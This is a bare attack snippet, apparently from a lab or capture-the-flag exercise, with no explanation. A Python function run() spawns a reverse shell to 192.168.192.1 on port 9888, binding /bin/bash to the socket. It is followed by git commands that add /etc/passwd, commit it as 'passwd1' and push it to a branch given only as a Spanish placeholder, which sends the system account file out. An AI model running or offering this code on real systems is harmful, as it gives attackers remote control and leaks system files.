import subprocess
def run():
 subprocess.run(["python3", "-c", "import os,pty,socket;s=socket.socket();s.connect(('192.168.192.1',9888));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn('/bin/bash')"])

git add /etc/passwd
git commit -m "passwd1"
git push origin <nombre_de_la_rama>
